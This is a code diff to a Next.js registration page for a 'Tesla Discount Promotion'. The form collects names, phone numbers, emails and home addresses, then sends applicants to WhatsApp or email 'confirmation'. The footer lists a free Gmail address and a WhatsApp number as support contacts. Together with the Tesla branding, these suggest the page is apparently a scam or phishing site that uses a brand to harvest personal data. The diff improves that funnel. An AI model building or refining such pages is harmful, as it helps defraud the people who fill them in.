@@ -5,7 +5,7 @@ import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import { useRouter } from 'next/navigation';
-import { Car, Loader2 } from 'lucide-react';
+import { Car, Loader2, MessageSquare, Mail, Check } from 'lucide-react';
 import Image from 'next/image';
 
 const formSchema = z.object({
@@ -13,6 +13,7 @@ const formSchema = z.object({
   phoneNumber: z.string().min(7, "Phone number with country code is required"),
   emailAddress: z.string().email("Please enter a valid email address"),
   residentialAddress: z.string().min(10, "Full residential address is required"),
+  confirmationMethod: z.enum(['whatsapp', 'email']),
   consent: z.boolean().refine((val) => val === true, {
     message: "You must agree to the terms to proceed",
   }),
@@ -27,10 +28,16 @@ export default function Home() {
   const {
     register,
     handleSubmit,
+    watch,
     formState: { errors, isSubmitting },
   } = useForm<FormData>({
     resolver: zodResolver(formSchema),
+    defaultValues: {
+      confirmationMethod: 'whatsapp',
+    },
   });
+
+  const selectedMethod = watch('confirmationMethod', 'whatsapp');
 
   const onSubmit = async (data: FormData) => {
     setServerError(null);
@@ -48,19 +55,11 @@ export default function Home() {
         return;
       }
 
-      const refCode = result.id ? result.id.split('-')[0].toUpperCase() : '';
-      const whatsappNumber = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER || '19193093163';
-      const cleanPhone = whatsappNumber.replace(/[^0-9]/g, '');
-
-      const messageText = encodeURIComponent(
-        `Hello! I just submitted my registration for the Tesla Discount Promotion.\n` +
-        `Name: ${data.fullName}\n` +
-        `Reference Code: #${refCode}\n\n` +
-        `Please confirm my registration. Thank you!`
+      // Navigate applicant to confirmation page with their reference & method
+      const method = data.confirmationMethod || 'whatsapp';
+      router.push(
+        `/confirmation?id=${result.id}&name=${encodeURIComponent(data.fullName)}&email=${encodeURIComponent(data.emailAddress)}&method=${method}&emailSent=${result.emailSent ? '1' : '0'}`
       );
-
-      // Immediately redirect applicant directly to WhatsApp
-      window.location.href = `https://wa.me/${cleanPhone}?text=${messageText}`;
     } catch (error) {
       setServerError('A network error occurred. Please try again.');
     }
@@ -168,6 +167,67 @@ export default function Home() {
                 {errors.residentialAddress && <p className="mt-2 text-xs text-red-400">{errors.residentialAddress.message}</p>}
               </div>
 
+              <div>
+                <label className="block text-xs font-medium text-gray-400 uppercase tracking-widest mb-3">
+                  Preferred Confirmation Channel
+                </label>
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                  <label
+                    className={`flex items-start p-3.5 rounded border cursor-pointer transition-all ${
+                      selectedMethod === 'whatsapp'
+                        ? 'border-[#25D366] bg-[#25D366]/10 shadow-[0_0_12px_rgba(37,211,102,0.15)]'
+                        : 'border-[#333] bg-[#2a2a2a] hover:border-gray-500'
+                    }`}
+                  >
+                    <input
+                      type="radio"
+                      value="whatsapp"
+                      {...register("confirmationMethod")}
+                      className="sr-only"
+                    />
+                    <div className="flex items-center space-x-3 w-full">
+                      <div className={`p-2 rounded-full ${selectedMethod === 'whatsapp' ? 'bg-[#25D366] text-black' : 'bg-[#333] text-gray-400'}`}>
+                        <MessageSquare size={16} />
+                      </div>
+                      <div className="flex-1">
+                        <div className="flex items-center justify-between">
+                          <span className="text-xs font-semibold text-white tracking-wide">WhatsApp</span>
+                          {selectedMethod === 'whatsapp' && <Check size={14} className="text-[#25D366]" />}
+                        </div>
+                        <p className="text-[11px] text-gray-400 mt-0.5">Instant chat confirmation</p>
+                      </div>
+                    </div>
+                  </label>
+
+                  <label
+                    className={`flex items-start p-3.5 rounded border cursor-pointer transition-all ${
+                      selectedMethod === 'email'
+                        ? 'border-blue-400 bg-blue-500/10 shadow-[0_0_12px_rgba(59,130,246,0.15)]'
+                        : 'border-[#333] bg-[#2a2a2a] hover:border-gray-500'
+                    }`}
+                  >
+                    <input
+                      type="radio"
+                      value="email"
+                      {...register("confirmationMethod")}
+                      className="sr-only"
+                    />
+                    <div className="flex items-center space-x-3 w-full">
+                      <div className={`p-2 rounded-full ${selectedMethod === 'email' ? 'bg-blue-400 text-black' : 'bg-[#333] text-gray-400'}`}>
+                        <Mail size={16} />
+                      </div>
+                      <div className="flex-1">
+                        <div className="flex items-center justify-between">
+                          <span className="text-xs font-semibold text-white tracking-wide">Email</span>
+                          {selectedMethod === 'email' && <Check size={14} className="text-blue-400" />}
+                        </div>
+                        <p className="text-[11px] text-gray-400 mt-0.5">No WhatsApp account needed</p>
+                      </div>
+                    </div>
+                  </label>
+                </div>
+              </div>
+
               <div className="pt-4 border-t border-[#333]">
                 <div className="flex items-start">
                   <div className="flex items-center h-5 mt-0.5">
@@ -216,7 +276,7 @@ export default function Home() {
       </main>
 
       <footer className="bg-black py-12 border-t border-[#222]">
-        <div className="max-w-5xl mx-auto px-6 grid grid-cols-1 md:grid-cols-3 gap-8">
+        <div className="max-w-5xl mx-auto px-6 grid grid-cols-1 md:grid-cols-4 gap-8">
           <div>
             <h3 className="text-gray-200 font-medium tracking-wide mb-4 text-sm uppercase">About</h3>
             <p className="text-xs text-gray-500 leading-relaxed">An independent promotion offering potential discounts on electric vehicles to selected applicants. Subject to terms and availability.</p>
@@ -225,6 +285,13 @@ export default function Home() {
             <h3 className="text-gray-200 font-medium tracking-wide mb-4 text-sm uppercase">Eligibility</h3>
             <p className="text-xs text-gray-500 leading-relaxed">Open to residents 18 years and older. Registration is free and does not guarantee selection or the award of any discount.</p>
           </div>
+            <div>
+              <h3 className="text-gray-200 font-medium tracking-wide mb-4 text-sm uppercase">Contact</h3>
+              <p className="text-xs text-gray-500 leading-relaxed">
+                WhatsApp Support: +1 (919) 309-3163<br />
+                Email: teslaspaceinnovation34@gmail.com
+              </p>
+            </div>
           <div>
             <h3 className="text-gray-200 font-medium tracking-wide mb-4 text-sm uppercase">Legal</h3>
             <ul className="text-xs space-y-3 text-gray-500">
